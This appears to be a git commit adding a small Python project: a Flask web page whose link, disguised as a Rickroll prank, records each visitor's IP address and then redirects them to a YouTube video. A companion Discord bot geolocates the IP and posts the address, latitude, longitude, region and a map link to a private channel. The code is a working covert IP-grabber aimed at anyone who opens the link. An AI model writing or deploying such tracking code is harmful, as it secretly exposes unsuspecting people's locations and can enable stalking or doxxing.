cd469e2d0196b5555da0b59e85c182dd27848cf5
Coder-Anonymous <93427110+Coder-Serwin@users.noreply.github.com>
2024-10-25 12:37:21 +0530

    Add files via upload

---
+++ bot.py
@@ -0,0 +1,42 @@
+import discord
+import time
+import datetime
+import os
+import ipinfo
+from dotenv import load_dotenv
+
+client = None
+load_dotenv()
+
+D_TOKEN = os.getenv('D_TOKEN')
+API_KEY = os.getenv('API_KEY')
+
+class MyClient(discord.Client):
+        async def on_ready(self):
+            print('Logged on as', self.user)
+            channeln = client.get_channel(906776389749981197)
+            ip_addr = os.getenv("IP_ADDR")
+            ip_addr = ip_addr.split(",")[0]
+            embed = discord.Embed(title="NEW",
+                                 description="New person got RIckrolled!",
+                                 timestamp=datetime.datetime.utcnow())
+            embed.add_field(name="Ip Addr : ", value=ip_addr)
+            handler = ipinfo.getHandler(API_KEY)
+            details = handler.getDetails(ip_addr.split(",")[0])
+            la_response = str(details.loc).split(",")[0]
+            lo_response = str(details.loc).split(",")[1]
+            region = str(details.region)
+            embed.add_field(name="Latitude", value=la_response)
+            embed.add_field(name="Longittude", value=lo_response)
+            embed.add_field(name="Region", value=region)
+            map_url = f'https://www.google.com/maps/place/@{la_response},{lo_response}/'
+            embed.add_field(name="Map URl", value=map_url)
+            await channeln.send(embed=embed)
+            time.sleep(1)
+            await client.close()
+
+if __name__ == "__main__":
+  intents = discord.Intents.default()
+  intents.message_content = True
+  client = MyClient(intents=intents)
+  client.run(str(D_TOKEN))
---
+++ main.py
@@ -0,0 +1,22 @@
+from flask import Flask, request, redirect
+from bot import *
+import random
+from subprocess import call
+import time
+
+os.environ['IP_ADDR'] = "None"
+app = Flask(__name__)
+ip_address = None
+
+
+@app.route('/')
+def home():
+    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR',request.remote_addr)
+    os.environ['IP_ADDR'] = ip_address
+    time.sleep(1)
+    call(["python", "bot.py"])
+    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=random.randint(2000, 9000))
